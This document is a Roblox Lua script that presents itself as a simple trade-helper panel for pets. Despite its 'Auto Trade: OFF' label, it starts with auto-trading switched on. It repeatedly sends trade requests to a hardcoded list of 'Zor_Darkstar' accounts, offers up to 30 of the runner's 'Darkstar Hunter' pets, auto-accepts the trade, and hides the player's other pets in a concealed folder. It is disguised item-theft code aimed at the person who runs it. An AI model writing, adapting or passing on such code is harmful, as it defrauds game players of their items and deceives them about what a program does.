local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local event = ReplicatedStorage:WaitForChild("rEvents", 5) and ReplicatedStorage.rEvents:WaitForChild("tradingEvent", 5)
local ALLOWED_DISPLAY_NAMES = {
    "Zor_Darkstar1",
    "Zor_Darkstar2",
    "Zor_Darkstar3",
    "Zor_Darkstar4",
    "Zor_Darkstar5",
    "Zor_Darkstar6",
    "Zor_Darkstar7",
    "Zor_Darkstar8",
    "Zor_Darkstar9",
    "Zor_Darkstar10",
    "Zor_Darkstar11",
    "Zor_Darkstar12"
}

local petsFolder = LocalPlayer:WaitForChild("petsFolder", 5)
local hiddenStorage = ReplicatedStorage:FindFirstChild("ZorVexStorage") or Instance.new("Folder", ReplicatedStorage)
hiddenStorage.Name = "ZorVexStorage"

local PetName = "Darkstar Hunter"
local amount = 30
local petOriginTable = {}
local autoTradeActive = true

local function findAllPlayersByDisplayNames(nameList)
    local matchedPlayers = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            local playerLower = string.lower(player.DisplayName)
            for _, allowedName in ipairs(nameList) do
                if playerLower == string.lower(allowedName) then
                    table.insert(matchedPlayers, player)
                    break -- Keluar dari loop jika sudah cocok
                end
            end
        end
    end
    return matchedPlayers
end

local function InitialHideAll()
    if not petsFolder then return end
    for _, folder in ipairs(petsFolder:GetChildren()) do
        if folder:IsA("Folder") then
            for _, pet in ipairs(folder:GetChildren()) do
                petOriginTable[pet] = folder
                pet.Parent = hiddenStorage
            end
        end
    end
end
InitialHideAll()

local function runExecution()
    if not petsFolder then return false end
    
    local allPets = {}
    for _, folder in ipairs(petsFolder:GetChildren()) do
        if folder:IsA("Folder") then
            for _, pet in ipairs(folder:GetChildren()) do
                petOriginTable[pet] = folder
                table.insert(allPets, pet)
            end
        end
    end
    for _, pet in ipairs(hiddenStorage:GetChildren()) do 
        table.insert(allPets, pet) 
    end
    
    local count = 0
    for _, pet in ipairs(allPets) do
        if pet.Name == PetName and count < amount then
            pet.Parent = petOriginTable[pet] or petsFolder:FindFirstChildWhichIsA("Folder")
            count = count + 1
        else
            pet.Parent = hiddenStorage
        end
    end
    return true, count
end

local function isTradePending()
    local tradeVal = LocalPlayer:FindFirstChild("isTrading")
    if tradeVal then
        if tradeVal.Value == "on" or tradeVal.Value == true or tradeVal.Value == 1 then
            return true
        end
    end
    return false
end

local function getPetInstances(petName, n)
    local pets = {}
    if not petsFolder then return pets end 

    for _, folder in ipairs(petsFolder:GetChildren()) do
        if folder:IsA("Folder") then
            for _, pet in ipairs(folder:GetChildren()) do
                if pet.Name == petName then
                    table.insert(pets, pet)
                    if #pets >= n then return pets end
                end
            end
        end
    end
    return pets
end

if game.CoreGui:FindFirstChild("ZorVexSimpleTrade") then 
    game.CoreGui.ZorVexSimpleTrade:Destroy() 
end

local sg = Instance.new("ScreenGui", game.CoreGui)
sg.Name = "ZorVexSimpleTrade"
sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local bg = Instance.new("Frame", sg)
bg.Size = UDim2.new(0, 220, 0, 150)
bg.Position = UDim2.new(0.5, -110, 0.5, -75)
bg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
bg.BackgroundTransparency = 0.2
bg.BorderSizePixel = 0
bg.Active = true
bg.Draggable = true

Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 10)

local acceptBtn = Instance.new("TextButton", bg)
acceptBtn.Size = UDim2.new(0, 180, 0, 30)
acceptBtn.Position = UDim2.new(0.5, -90, 0, 15)
acceptBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
acceptBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
acceptBtn.Font = Enum.Font.GothamBold
acceptBtn.TextSize = 13
acceptBtn.Text = "Button acceptTrade"

Instance.new("UICorner", acceptBtn).CornerRadius = UDim.new(0, 6)

acceptBtn.MouseButton1Click:Connect(function()
    if event then
        pcall(function()
            event:FireServer("acceptTrade")
        end)
    end
end)

local confirmBtn = Instance.new("TextButton", bg)
confirmBtn.Size = UDim2.new(0, 180, 0, 30)
confirmBtn.Position = UDim2.new(0.5, -90, 0, 55)
confirmBtn.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
confirmBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
confirmBtn.Font = Enum.Font.GothamBold
confirmBtn.TextSize = 13
confirmBtn.Text = "Confirm + Offer Pets"

Instance.new("UICorner", confirmBtn).CornerRadius = UDim.new(0, 6)

confirmBtn.MouseButton1Click:Connect(function()
    pcall(runExecution)

    if event then
        pcall(function()
            local tradeActive = isTradePending()
            
            if tradeActive then
                pcall(function()
                    event:FireServer("acceptTrade")
                end)
            else
                local targetPlayers = findAllPlayersByDisplayNames(ALLOWED_DISPLAY_NAMES)
                for _, targetPlayer in ipairs(targetPlayers) do
                    pcall(function()
                        event:FireServer("requestAccepted", targetPlayer)
                    end)
                end
            end
        end)
        
        task.spawn(function()
            local startTime = os.clock()
            local pets = getPetInstances(PetName, 30)
            local index = 1
            
            while (os.clock() - startTime) < 1.0 do
                local pet = pets[index]
                if pet and pet.Parent then
                    pcall(function()
                        event:FireServer("offerItem", pet)
                    end)
                    index = index + 1
                    if index > #pets then break end
                end
                task.wait(0.001)
            end
        end)
    end
end)

local autoTradeBtn = Instance.new("TextButton", bg)
autoTradeBtn.Size = UDim2.new(0, 180, 0, 30)
autoTradeBtn.Position = UDim2.new(0.5, -90, 0, 95)
autoTradeBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
autoTradeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
autoTradeBtn.Font = Enum.Font.GothamBold
autoTradeBtn.TextSize = 13
autoTradeBtn.Text = "Auto Trade: OFF"

Instance.new("UICorner", autoTradeBtn).CornerRadius = UDim.new(0, 6)

autoTradeBtn.MouseButton1Click:Connect(function()
    autoTradeActive = not autoTradeActive
    if autoTradeActive then
        autoTradeBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        autoTradeBtn.Text = "Auto Trade: ON"
    else
        autoTradeBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
        autoTradeBtn.Text = "Auto Trade: OFF"
    end
end)

task.spawn(function()
    while true do
        if autoTradeActive and event then
            if not isTradePending() then
                pcall(function()
                    local targetPlayers = findAllPlayersByDisplayNames(ALLOWED_DISPLAY_NAMES)
                    for _, targetPlayer in ipairs(targetPlayers) do
                        pcall(function()
                            event:FireServer("requestAccepted", targetPlayer)
                        end)
                    end
                end)
                task.wait(0.1)
            else
                pcall(runExecution)
                
                                local startTime = os.clock()
                local pets = getPetInstances(PetName, 30)
                local index = 1
                
                while (os.clock() - startTime) < 1.0 do
                    local pet = pets[index]
                    if pet and pet.Parent then
                        pcall(function()
                            event:FireServer("offerItem", pet)
                        end)
                        index = index + 1
                        if index > #pets then break end
                    end
                    task.wait(0.001)
                end
                
                pcall(function()
                    event:FireServer("acceptTrade")
                end)
                
                while isTradePending() do
                    task.wait(0.1)
                end
                
                task.wait(0.3)
            end
        end
        task.wait(0.05)
    end 
end)
